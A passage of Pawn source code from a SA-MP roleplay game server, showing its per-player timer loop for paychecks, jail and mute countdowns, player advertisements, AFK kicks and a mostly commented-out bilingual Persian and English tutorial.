if(GodmodeFeature[i] == true && IsPlayerInAnyVehicle(i) && PlayerInfo[i][pAdmin] >= 7)
{
    RepairVehicleEx(GetPlayerVehicleID(i));
    SetVehicleHealthEx(GetPlayerVehicleID(i),1000000.0);
}
if(GetPlayerPool(i) != GetPlayerMoney(i))
{
    ResetPlayerMoney(i);
    GivePlayerMoney(i,GetPlayerPool(i));
}
            new newcar = GetPlayerVehicleID(i);
            new level = PlayerInfo[i][pLevel];
            if(PlayerInfo[i][pPremiumAccount] == 0 && gPlayerLogged[i] != 0 && AFK[i] != 1)
            {
                if(level >= 0 && level <= 2) { PlayerInfo[i][pPayCheck] += 0.08; }//Nemikhad save shan...
                else if(level >= 3 && level <= 4) { PlayerInfo[i][pPayCheck] += 0.16; }
                else if(level >= 5 && level <= 6) { PlayerInfo[i][pPayCheck] += 0.24; }
                else if(level >= 7 && level <= 8) { PlayerInfo[i][pPayCheck] += 0.32; }
                else if(level >= 9 && level <= 10) { PlayerInfo[i][pPayCheck] += 0.4; }
                else if(level >= 11 && level <= 12) { PlayerInfo[i][pPayCheck] += 0.48; }
                else if(level >= 13 && level <= 14) { PlayerInfo[i][pPayCheck] += 0.56; }
                else if(level >= 15 && level <= 16) { PlayerInfo[i][pPayCheck] += 0.64; }
                else if(level >= 17 && level <= 18) { PlayerInfo[i][pPayCheck] += 0.72; }
                else if(level >= 19 && level <= 20) { PlayerInfo[i][pPayCheck] += 0.8; }
                else if(level >= 21 && level <= 23) { PlayerInfo[i][pPayCheck] += 0.88; }
                else if(level >= 24 && level <= 27) { PlayerInfo[i][pPayCheck] += 0.96; }
                else if(level >= 28 && level <= 32) { PlayerInfo[i][pPayCheck] += 1.04; }
                else if(level >= 33) { PlayerInfo[i][pPayCheck] += 1.12; }
            }
            if(PlayerInfo[i][pPremiumAccount] != 0 && gPlayerLogged[i] != 0)
            {
                if(level >= 0 && level <= 2) { PlayerInfo[i][pPayCheck] += 0.16; }
                else if(level >= 3 && level <= 4) { PlayerInfo[i][pPayCheck] += 0.32; }
                else if(level >= 5 && level <= 6) { PlayerInfo[i][pPayCheck] += 0.48; }
                else if(level >= 7 && level <= 8) { PlayerInfo[i][pPayCheck] += 0.64; }
                else if(level >= 9 && level <= 10) { PlayerInfo[i][pPayCheck] += 0.8; }
                else if(level >= 11 && level <= 12) { PlayerInfo[i][pPayCheck] += 0.96; }
                else if(level >= 13 && level <= 14) { PlayerInfo[i][pPayCheck] += 1.12; }
                else if(level >= 15 && level <= 16) { PlayerInfo[i][pPayCheck] += 1.28; }
                else if(level >= 17 && level <= 18) { PlayerInfo[i][pPayCheck] += 1.44; }
                else if(level >= 19 && level <= 20) { PlayerInfo[i][pPayCheck] += 1.6; }
                else if(level >= 21 && level <= 23) { PlayerInfo[i][pPayCheck] += 1.76; }
                else if(level >= 24 && level <= 27) { PlayerInfo[i][pPayCheck] += 1.92; }
                else if(level >= 28 && level <= 32) { PlayerInfo[i][pPayCheck] += 2.08; }
                else if(level >= 33) { PlayerInfo[i][pPayCheck] += 2.24; }
            }
            if(IsPlayerConnected(i) && GetPlayerSurfingVehicleID(i) != INVALID_VEHICLE_ID && !IsABoat(GetPlayerSurfingVehicleID(i)) && Surfing[i] == 0)
            {
                if(soratbegirs(GetPlayerSurfingVehicleID(i)) <= 15) {}
                else
                {
                    new Float:Uu[3];
                    GetPlayerPos(i,Uu[0],Uu[1],Uu[2]);
                    SetPlayerPosEx(i, Uu[0],Uu[1],Uu[2]);
                }
            }
            if(PlayerInfo[i][pJailTime] > 0)
            {
                if(PlayerInfo[i][pJailTime] > 0/* && WantLawyer[i] == 0*/)
                {
                    PlayerInfo[i][pJailTime]--;
                    SaveKonVal(i, "pJailTime", PINFO[i][pJailTime]);
                    new strings[256];
                    format(strings, sizeof(strings), "Jail Time Left: %d:%02d",PlayerInfo[i][pJailTime]/60,PlayerInfo[i][pJailTime]-(floatround(PlayerInfo[i][pJailTime]/60)*60));
                    TextDrawSetString(JailTextDraw[i],strings);
                }
                if(PlayerInfo[i][pJailTime] <= 0)
                {
                        PlayerInfo[i][pJailTime] = 0;
                        SaveKonVal(i, "pJailTime", PINFO[i][pJailTime]);
                        SetPlayerPosEx(i,1799.992309,-1578.568725,14.076499);
                        SetPlayerFacingAngle(i,270);
                        SetPlayerInterior(i,0);
                        SetPlayerVirtualWorld(i,0);
                        if(IsInFaction(i)) { SetPlayerSkin(i,PlayerInfo[i][fSkin]); }
                        else { SetPlayerSkin(i,PlayerInfo[i][cSkin]); }
                        if(PINFO[i][pAdmin] > 1998) SetPlayerSkin(i, 217);
                        Mahal[i] = 9999;
                        TooHouse[i] = 9999;
                        TooBiz[i] = 9999;
                        TextDrawHideForPlayer(i,JailTextDraw[i]);
                    TogglePlayerControllable(i,1);
                    RemovePlayerAttachedObject(i, 1);
                    SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
                    PlayerHandsCuffed[i] = 0;
                    PlayerCuffed[i] = 0;
                    SendClientMessage(i, COLOR_LIGHTRED,"Warden: Shoma Az Zendan Azad Shodid. Ghabl Az Anjam Jorm, Darbare Avagheb On Fekr Konid.");

                    SetPlayerToTeamColor(i);
                    SetPlayerInterior(i, 0);
                }
            }
            else if(PlayerInfo[i][pMuteTime] > 0)
            {
                PlayerInfo[i][pMuteTime]--;
                SaveKonVal(i, "pMuteTime", PINFO[i][pMuteTime]);
                if(PlayerInfo[i][pMuteTime] <= 0)
                {
                    PlayerInfo[i][pMuteTime] = 0;
                    SaveKonVal(i, "pMuteTime", PINFO[i][pMuteTime]);
                    SendClientMessage(i, COLOR_LIGHTBLUE, "Your time of silence has ended.");
                    format(string, 256, "Mute time has ended!");
                    GameTextForPlayer(i, string, 5000, 1);
                }
            }
            if(TimerAnnouncer[i] > 0) {TimerAnnouncer[i] --; if(TimerAnnouncer[i] <= 0) { Ghatel[i] = INVALID_PLAYER_ID; GhatelWanted[i] = 0; strdel(CrimeText[i], 0, 100); }}
            if(IsABoat(newcar))
            {
                if(PlayerInfo[i][pBoatLic] < 1 && GetPlayerState(i) == 2)
                {
                    if(TakingsiLesson[i] == 1) { }
                }
            }
            else if(IsAPlane(newcar))
            {
                if(PlayerInfo[i][pFlyLic] < 1 && GetPlayerState(i) == 2)
                {
                    if(TakingsiLesson[i] == 1) { }
                }
            }
            else
            {
                if(PlayerInfo[i][pCarLic] < 1 && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == 2)
                {
                    if(TakingLesson[i] == 1) { }
                }
            }//Done with car check
            if(adtimer > 0) { adtimer --; }
            if(adtimerplayer[i] > 0)
            {
                adtimerplayer[i] --;
                if(adtimerplayer[i] == 0 && IsPlayerConnected(i) && gPlayerLogged[i] == 1)
                {
                    new shomarebedeamoo = PlayerInfo[i][pPnumber];
                    new sendername[MAX_PLAYER_NAME];
                    new nesfshode[300];
                    new strlolis[300];
                    new strasl[300];
                    GetPlayerName(i, sendername, sizeof(sendername));
                    if(strlen(adtextplayer[i])+strlen(PINFO[i][pName])+strlen("Ad Placed by  (Phone:  ): ") < 50) {format(strasl, 300, "Ad Placed by %s (Phone: {FFFFFF}%s{18E139}): %s.",sendername,FormatPhoneNumber(shomarebedeamoo),adtextplayer[i]);
                    OOCNews(ADVERTISEMEN_COLOR,strasl);}
                    else
                    {
                        new b = 0;
                        for(new w;w<50;w++)
                        {
                            strlolis[b] = adtextplayer[i][w];
                            b++;
                        }
                        b = 0;
                        for(new w = 50;w<strlen(adtextplayer[i]);w++)
                        {
                            nesfshode[b] = adtextplayer[i][w];
                            b++
                        }
                        format(strasl, 300 , "Ad Placed by %s (Phone: {FFFFFF}%s{18E139}): %s ...",sendername,FormatPhoneNumber(shomarebedeamoo),strlolis);
                        OOCNews(ADVERTISEMEN_COLOR,strasl);
                        format(strasl, 300 , "... %s.", nesfshode);
                        OOCNews(ADVERTISEMEN_COLOR,strasl);
                    }
                    adtimerplayer[i] = 0;
                }
            }
            if(UsedFind[i] >= 1)
            {
                UsedFind[i] += 1;
                if(UsedFind[i] >= 120)
                {
                    UsedFind[i] = 0;
                }
            }
            if(PINFO[i][pJailTime] > 0 && PINFO[i][pAdmin] < 1 && PINFO[i][pHelper] < 1)
            {
                new Float:ui[3];
                GetPlayerPos(i, ui[0], ui[1], ui[2]);
                if(ui[0] >= 1723.025024 && ui[0] <= 1808.025024 && ui[1] >= -1582.543090 && ui[1] <= -1536.632812 && ui[2] >= 1982.749633 && ui[2] <= 2018.235107) {}
                else
                {
                    SpawnPlayer(i);
                }
            }
            if(PlayerFish[i] >= 1)
            {
                PlayerFish[i] --;
            }
            if(MedicTime[i] > 0)
            {
                if(MedicTime[i] == 3)
                {
                    SetPlayerInterior(i, 5);
                    new Float:X, Float:Y, Float:Z;
                    GetPlayerPos(i, X,Y,Z);
                    SetPlayerCameraPos(i, X + 3, Y, Z);
                    SetPlayerCameraLookAt(i,X,Y,Z);
                }
                MedicTime[i] ++;
                if(MedicTime[i] >= NeedMedicTime[i])
                {
                    TogglePlayerControllable(i, 1);
                    MedicBill[i] = 0;
                    MedicTime[i] = 0;
                    NeedMedicTime[i] = 0;
                    PlayerFixRadio(i);
                    StopLoopingAnim(i);
                    ResetPlayerTofang(i);
                    SetSpawnKol(i);
                    SpawnPlayer(i);
                }
            }
            if(OnRentMashinMessage[i] == true && !IsPlayerInAnyVehicle(i))
            {
                TogglePlayerControllable(i, 1);
                OnRentMashinMessage[i] = false;
                GameTextForPlayer(i, " ", 500, 3);
            }
            if(ContractID[i] != INVALID_PLAYER_ID)
            {
                if(ContractsCount >= 2)
                {
                    if(PINFO[i][pHeadValue] >= 1)
                    {
                        if(AgentHiterID[i] == INVALID_PLAYER_ID)
                        {
                            for(new b;b<LastPID;b++)
                            {
                                if(IsPlayerConnected(b))
                                {
                                    if(PINFO[b][pMember] == 8 || PINFO[b][pLeader] == 8)
                                    {
                                        if(AgentContractID[b] != INVALID_PLAYER_ID)
                                        {
                                            AgentHiterID[i] = b;
                                            AgentHitID[b] = i;
                                            new atring[256];
                                            format(atring,256,"There is a new contract for you, his/her name is %s(%i)",PINFO[i][pName],i);
                                            SCM(b,COLOR_HITMAN,atring);
                                            ContractsCount --;
                                            ContractIDUsed[ContractID[i]] = false;
                                            ContractID[i] = INVALID_PLAYER_ID;
                                            AgentContractIDUsed[b] = false;
                                            AgentContractID[b] = INVALID_PLAYER_ID;
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if(GetPlayerState(i) == PLAYER_STATE_PASSENGER)
            {
            if(GetPlayerWeapon(i) == 30 || GetPlayerWeapon(i) == 29 || GetPlayerWeapon(i) == 31)
            {} else { SetPlayerArmedWeapon(i,0); }
            }
if(TimerRingTone[i] >= 1)
{
TimerRingTone[i] ++;
}
if(TimerRingTone[i] == 5)
{
PlayerPlaySound(i, 23000,0.0,0.0,0.0)
TimerRingTone[i] = 1;
}
            if(WantLawyer[i] >= 1)
            {
                CallLawyer[i] = 111;
                if(WantLawyer[i] == 1)
                {
                    SendClientMessage(i, COLOR_YELLOW2, "Do you want a Lawyer? (Type yes or no)");
                }
                WantLawyer[i] ++;
                if(WantLawyer[i] == 8)
                {
                    SendClientMessage(i, COLOR_YELLOW2, "Do you want a Lawyer? (Type yes or no)");
                }
                if(WantLawyer[i] == 15)
                {
                    SendClientMessage(i, COLOR_YELLOW2, "Do you want a Lawyer? (Type yes or no)");
                }
                if(WantLawyer[i] == 20)
                {
                    SendClientMessage(i, COLOR_YELLOW2, "There is no Lawyer available to you anymore.");
                    WantLawyer[i] = 0;
                    CallLawyer[i] = 0;
                }
            }
            if(AFK[i] == 0) AFKTime[i] ++;
            if(AFKTime[i] == AFKTimeOnSV*60-120 && PINFO[i][pAdmin] < 7 && AFK[i] == 0 && PINFO[i][pJailTime] <= 0) SCM(i, COLOR_LIGHTRED, "Warning: You have 120 seconds to move or you'll kick due to afk.");
            if(AFKTime[i] == WantedAFKTime*60-120 && GetPlayerWantedLevel(i) > 0 && PINFO[i][pAdmin] < 7 && PINFO[i][pJailTime] <= 0) SCM(i,COLOR_LIGHTRED,"Warning: You have 120 seconds to move or you'll kick due to afk(Wanted AFK).");
            //if(AFKTime[i] >= AFKTimeOnSV*60 && PINFO[i][pAdmin] < 7 && AFK[i] == 0 && PINFO[i][pJailTime] <= 0 && pNoAFK[i] == 0) PlayerIsAFKDetected(i);
            if(AFKTime[i] >= WantedAFKTime*60 && GetPlayerWantedLevel(i) > 0 && PINFO[i][pAdmin] < 7 && PINFO[i][pJailTime] <= 0) WantedAFKDetected(i);
            if(TutTime[i] >= 1)
            {
                TutTime[i] += 1;
                SetPlayerKhoon(true, i,100.0);
                HealthAllowedForPlayer[i] = 0;
            /*    if(TutTime[i] == 3)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, -2592.4817, -250.2809, 50.0363);
                    SetPlayerCameraLookAt(i, -2593.4553, -250.4990, 49.8615);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Shoroo{FFFF00}_____|");
                }
                else if(TutTime[i] == 6)
                {
                    SendClientMessage(i, COLOR_TUT96, "Salam, Khosh amadid be Server ma (Virtual Life iran) ma yek seri ghavanin haro behetoon neshoon midim.");
                    SendClientMessage(i, COLOR_TUT96, "Tamame Bazikon Ha bayad bedoonan ke che kari ro mitoonan anjam bedan ya che kari ro nemitoonan anjam bedan ");
                    SendClientMessage(i, COLOR_TUT96, "ma ye seri nokte haro dar ekhtiaretoon mizarim, agar soali bood forum maro bekhoonid(too bazi benevisid /forum).");
                }
                else if(TutTime[i] == 20)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, -2667.4875, 374.8930, 58.3701);
                    SetPlayerCameraLookAt(i, -2668.4871, 374.8922, 57.9753);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Darbare Server{FFFF00}_____|");
                }
                else if(TutTime[i] == 23)
                {
                    SendClientMessage(i, COLOR_TUT96, "In server darbareye mode Role Play hastesh (Mode zendegi).");
                    SendClientMessage(i, COLOR_TUT96, "Ma player haiee ke bekhan inja Death match rah bendazan ro Ban mikonim (baraye 1 rooz).");
                    SendClientMessage(i, COLOR_TUT96, "Esmi ke entekhab mikonid nabayad daraie kalamate gheire akhlaghi bashe vagarna Ban mishid.");
                    SendClientMessage(i, COLOR_TUT96, "be kar bordan kalamate gheyre akhlaghi too server mamnooe.");
                    SendClientMessage(i, COLOR_TUT96, "baraye etelaat bishtar darbare Role Play be Forum ma Sar bezanid (site ma : Www.VirtualLifeiran.iR).");
                    SendClientMessage(i, COLOR_TUT96, "(Shoma mitoonid Forum ro Dar Webpage ma Peida konid : http://Www.VirtualLifeiran.iR).");
                }
                else if(TutTime[i] == 38)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, -2031.5857, 353.3400, 88.2910);
                    SetPlayerCameraLookAt(i, -2031.2098, 352.4133, 87.9613);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Darbare komak{FFFF00}_____|");
                }
                else if(TutTime[i] == 41)
                {
                    SendClientMessage(i, COLOR_TUT96, "Age shoma ehtiaj be komak darid mitoonid be yeki az helper ha begid(/helpers).");
                    SCM(i, COLOR_TUT96, "(baraye darkhaste komak az komak konande ha(helper) az /helpme estefade konid.)");
                    SendClientMessage(i, COLOR_TUT96, "Baraye komak khastan be player ha begid : Salam, mitoonid be man komak konid? ya be English: Hey,Can you Help me?.");
                    SendClientMessage(i, COLOR_TUT96, "be kasi shelik nakon va ba kasi dava nakon.chon in kar to ro farde badi neshoon mide.");
                    SendClientMessage(i, COLOR_TUT96, "shoma mitooni az command haye /call ya /sms estefade konid ta ba kasi sohbat konid.");
                    SendClientMessage(i, COLOR_TUT96, "Shoma mitoonid hamishe forum ro check konid (http://Www.VirtualLifeiran.iR).");
                }
                else if(TutTime[i] == 58)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, -2707.1687, 1313.6182, 65.8692);
                    SetPlayerCameraLookAt(i, -2706.5752, 1312.8162, 65.7995);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Shoghl ha va faction ha{FFFF00}_____|");
                }
                else if(TutTime[i] == 61)
                {
                    SendClientMessage(i, COLOR_TUT96, "Age shoma mikhaid ke pool dar biarid bayad yek shoghl ya faction dashte bashid ( baraye didane job ha va peida kardaneshoon az commande (/jobs) estefade konid.");
                    SendClientMessage(i, COLOR_TUT96, "shoma MItoonid too in server Yek faction Va yek Job ba ham dashte bashid.");
                    SendClientMessage(i, COLOR_TUT96, "baraye Ozv shodan dar faction ha Bayad az dakhele forum site too ghesmat application(narm afzar)marboot be har faction, post (ba tavajoh be nemoone post too poste aval) bedin .");
                    SendClientMessage(i, COLOR_TUT96, "Level 3+: Fireman/Paramedic, News Reports, School Instructor, Tow Car Company ya Taxi Driver.");
                    SendClientMessage(i, COLOR_TUT96, "Level 5+ (family ha) : Member The Killers, Dangerous Tigers, Storm Men, Silence Mafia, The Racers, Legendary Men ya Fast N Furious.");
                    SendClientMessage(i, COLOR_TUT96, "Level 10+: Member Police Departament, FBI, National Guard, SFPD ya Hitman Agency. ");
                    SendClientMessage(i, COLOR_TUT96, "Shoghl Ha: Detective, Lawyer, Car Mechanic, Drugs Dealer, Arms Dealer, Farmer, Car jacker, Bus Driver, Garbageman, Trucker.");
                }
                else if(TutTime[i] == 77)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, -1522.5510, 539.6533, 82.8371);
                    SetPlayerCameraLookAt(i, -1521.6035, 539.3401, 82.2274);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Level{FFFF00}_____|");
                }
                else if(TutTime[i] == 80)
                {
                    SendClientMessage(i, COLOR_TUT96, "Dakhele Server Role Play Shoma mitoonid Level Bekharid.");
                    SendClientMessage(i, COLOR_TUT96, "Baraye Level Up Kardan Bayad Shoma Respect Points Dashte Bashid Har Respect point = 1 saat bazi kardan dar server. ");
                    SendClientMessage(i, COLOR_TUT96, "Ma Har Respect Points Ro Har Pay Day midim ( Sare Saat Yek Respect midim )");
                    SendClientMessage(i, COLOR_TUT96, "Baraye Didane inke Shoma chand ta Respect Points darid Va Chand Ta Baraye Kharidane Level Bad Niaz Darid az Command /stats Komak begirid Ke Neveshte Respect:'x/x'.");
                    SendClientMessage(i, COLOR_TUT96, "vaghti Shoma Respect Hatoon Kamel Shod Mesle Respect: 'x/x'.");
                    SCM(i, COLOR_TUT96, "Bayad Ba tavajoh be Level Bad Pool Dashte bashid ta level bekharid va har moghe in Pool(dar bazi).");
                    SCM(i, COLOR_TUT96, "Va Respect Points ro Dashtid mitoonid baraye Level up az commande /buylevel estefade konid.");
                }
                else if(TutTime[i] == 100)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, -1180.1394, 27.2583, 17.6298);
                    SetPlayerCameraLookAt(i, -1181.1384, 27.2638, 17.9301);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Taghalob ha va hack ha{FFFF00}_____|");
                }
                else if(TutTime[i] == 103)
                {
                    SendClientMessage(i, COLOR_TUT96, "Be hich onvan az Cheat Ya taghalob Estefade nakonid ke IP shoma Permanentaly Ban Khahad Shod.");
                    SendClientMessage(i, COLOR_TUT96, "Agar kasi az Cheat ya taghalob estefade mikard sari /report bedid Ta ma oon player ra ban konim.");
                    SendClientMessage(i, COLOR_TUT96, "Ino Be Yad dashte Bashid Ke age Cheat bezanid Anti Cheat haye Ghavie VirtualLifeiran Ip shomaro baraye hamishe Ban mikone va digar nemitavanid Vared server shavid!.");
                    SendClientMessage(i, COLOR_TUT96, "English : Do not forget! Anti-Cheat system works and you will receive permanent ban if you get caught.");
                }
                else if(TutTime[i] == 123)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, -1640.4900, -545.7268, 175.7513);
                    SetPlayerCameraLookAt(i, -1639.8539, -544.9559, 174.8417);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Zaban{FFFF00}_____|");
                }
                else if(TutTime[i] == 126)
                {
                    SendClientMessage(i, COLOR_TUT96, "Tamoome Bazikon Ha Hagh daran ke Ya az zabane English ya Az zabane Farsi Too server Estefade konan dar gheire in soorat Warn Migirid.");
                    SendClientMessage(i, COLOR_TUT96, "Age Shoma Doost Darid Az Zaban Haye Digar dar server estefade konid az /b estefade konid.");
                    SendClientMessage(i, COLOR_TUT96, "az CAPSLOCK moghe neveshtan estefade nakon va lotfan az kalamate dorost estefade kon.");
                    SendClientMessage(i, COLOR_TUT96, "Shoma Hagh nadarid ke az Kalamate Bad estefade konid!.");
                    SendClientMessage(i, COLOR_TUT96, "Tablighat Dar Bare Server Haye digar mesle Esme server ya IP server haye digar ,IP Shomaro Perement ban mikone.");
                }
                else if(TutTime[i] == 136)
                {
                SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, -2119.8645, -368.8832, 68.9332);
                    SetPlayerCameraLookAt(i, -2120.6257, -369.5326, 68.5384);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Payan{FFFF00}_____|");
                }
                else if(TutTime[i] == 139)
                {
                    SendClientMessage(i, COLOR_TUT96, "Omid Varam Lahzate khoobo Khoshi ro too servere ma begzaroonid.");
                    SendClientMessage(i, COLOR_TUT96, "age Khastid ke Dobare Tutorial Ro bebinid az '/rules' Ya '/tutorial' estefade konid.");
                    SendClientMessage(i, COLOR_TUT96, "VirtualLifeiran Lahzate khoshi Ro baraye shoma arezoo mikone.");
                    if(PINFO[i][pTut] == 0)
                    {PlayerInfo[i][pTut] = 1; SaveKonVal(i, "pTut", 1);}
                }
                else if(TutTime[i] >= 142)
                {
				*/
						PlayerInfo[i][pFlyLic] = 300;
		SaveKonVal(i, "pFlyLic", 300);

		PlayerInfo[i][pBoatLic] = 300;
		SaveKonVal(i, "pBoatLic", 300);

		PlayerInfo[i][pCarLic] = 300;
		SaveKonVal(i, "pCarLic", 300);

		PlayerInfo[i][pFishLic] = 300;
		SaveKonVal(i, "pFishLic", 300);

		PlayerInfo[i][pMatsLic] = 300;
		SaveKonVal(i, "pMatsLic", 300);

		PlayerInfo[i][pGunLic] = 300;
		SaveKonVal(i, "pGunLic", 300);


                    MedicBill[i] = 0;
                TutTime[i] = 0;
                TogglePlayerSpectating(i, 0);
                ResetPlayerTofang(i);
                SetSpawnKol(i);
                SpawnPlayer(i);
                    SCM(i, COLOR_WHITE, " ");
                    SetPlayerSpawn(i);
                    SetPlayerVirtualWorld(i, 0);
                    SetCameraBehindPlayer(i);
                    TogglePlayerControllable(i, 1);
                    SetPlayerKhoon(true, i,100);
                    SetPlayerPosEx(i,1641.9963,-2239.7080,13.4964);
                     SCM(i,COLOR_YELLOW,"{42f45f}[SERVER]{ffffff} Salam. Be Server Ma Khosh Omadi.");
                  //  SCM(i,COLOR_YELLOW,"{42f45f}[SERVER]{ffffff} Aval Bayad Govahiname Begiri Ta Betoni Ranandegi Koni.");
                    SCM(i,COLOR_YELLOW,"{42f45f}[JK-BOT]{ffffff} Server Be Shoma All License Dad.");
                    SCM(i,COLOR_ALI,"{42f45f}[SERVER]{ffffff} khoobe, alie alan to govahiname ranandegi dari va mitooni savare mashin va motor beshi.");
        			SCM(i,COLOR_ALI,"{42f45f}[SERVER]{ffffff} to mitooni shoghli dashte bashi va bahash pool dar biari, baraye peida kardane shoghle khoob,");
       				SCM(i,COLOR_ALI,"{42f45f}[SERVER]{ffffff} Type kon /jobs ta shoghle morede nazareto bbini va ozve oon shoghl beshi va kar konio pool dar biari.");
                   // OnCheckpoint[i] = 1;
                    //CP[i] = 94531;
                   // SetPlayerCheckpoint(i,1641.388671,-2177.379638,13.554687,4);
                    SetPlayerVirtualWorld(i, 0);
                    PlayerInfo[i][pTut] = 1;
                    SaveKonVal(i, "pTut", 1);
                    gOoc[i] = 0; gNews[i] = 0; gFam[i] = 0;
                    HealthAllowedForPlayer[i] = 1;
                    AntiKhoonHack[i] = SetTimerEx("KhoonTimer",2000,1,"i",i);
                }
        //    }
            if(TutTime1[i] >= 1)
            {
                TutTime1[i] += 1;
                SetPlayerKhoon(true, i,100);
                HealthAllowedForPlayer[i] = 0;
            /*    if(TutTime1[i] == 3)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, 1847.3835, -1279.1182, 162.2873);
                    SetPlayerCameraLookAt(i, 1847.2848, -1280.1263, 161.7025);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}The Beginning{FFFF00}_____|");
                }
                else if(TutTime1[i] == 6)
                {
                    SendClientMessage(i, COLOR_TUT96, "Hello there, I see you're new, we'll show you a quick Tutorial.");
                    SendClientMessage(i, COLOR_TUT96, "Firstly, all new players need to know what should or shouldn't on this server.");
                    SendClientMessage(i, COLOR_TUT96, "We'll give you some information, so please pay attention to avoid additional questions.");
                }
                else if(TutTime1[i] == 18)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, 1847.3835, -1279.1182, 162.2873);
                    SetPlayerCameraLookAt(i, 1847.2848, -1280.1263, 161.7025);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}About Server{FFFF00}_____|");
                }
                else if(TutTime1[i] == 21)
                {
                    SendClientMessage(i, COLOR_TUT96, "This server is a RolePlay.");
                    SendClientMessage(i, COLOR_TUT96, "We don't accept players who don't respect the rules or come here for DeathMach");
                    SendClientMessage(i, COLOR_TUT96, "The name that you have chosen matters a lot, each player can choose what name he/she likes.");
                    SendClientMessage(i, COLOR_TUT96, "We recommend you to choose legible name like: Andrew, Thomas, Matt.");
                    SendClientMessage(i, COLOR_TUT96, "If you want to know more about RPG, visit our forum.");
                    SendClientMessage(i, COLOR_TUT96, "(You can find the forum on our webpage: http://Www.VirtualLifeiran.iR)");
                }
                else if(TutTime1[i] == 36)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, 1847.3835, -1279.1182, 162.2873);
                    SetPlayerCameraLookAt(i, 1847.2848, -1280.1263, 161.7025);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Help{FFFF00}_____|");
                }
                else if(TutTime1[i] == 39)
                {
                    SendClientMessage(i, COLOR_TUT96, "If you're confused and you would like to know more information, ask a player or a helper(/helpers).");
                    SendClientMessage(i, COLOR_TUT96, "Use common sentences like: 'Hey, can you help me?'.");
                    SendClientMessage(i, COLOR_TUT96, "Don't start shout at someone, because it will make you lock bad.");
                    SendClientMessage(i, COLOR_TUT96, "Use commands /call or /sms (if you have cellphone) to talk with someone.");
                    SendClientMessage(i, COLOR_TUT96, "You can also access our forum (http://Www.VirtualLifeiran.iR) to receive more help.");
                }
                else if(TutTime1[i] == 56)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, 1847.3835, -1279.1182, 162.2873);
                    SetPlayerCameraLookAt(i, 1847.2848, -1280.1263, 161.7025);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Job's{FFFF00}_____|");
                }
                else if(TutTime1[i] == 59)
                {
                    SendClientMessage(i, COLOR_TUT96, "If you want to earn money you must have a job.");
                    SendClientMessage(i, COLOR_TUT96, "On this server you can have two type of jobs, one primary and one secondary.");
                    SendClientMessage(i, COLOR_TUT96, "Primay job's:(you must make an application on the forum and requires a certain level for each faction).");
                    SendClientMessage(i, COLOR_TUT96, "Level 3+: Fireman/Paramedic, News Reports, School Instructor, Tow Car Company or Taxi Drive.");
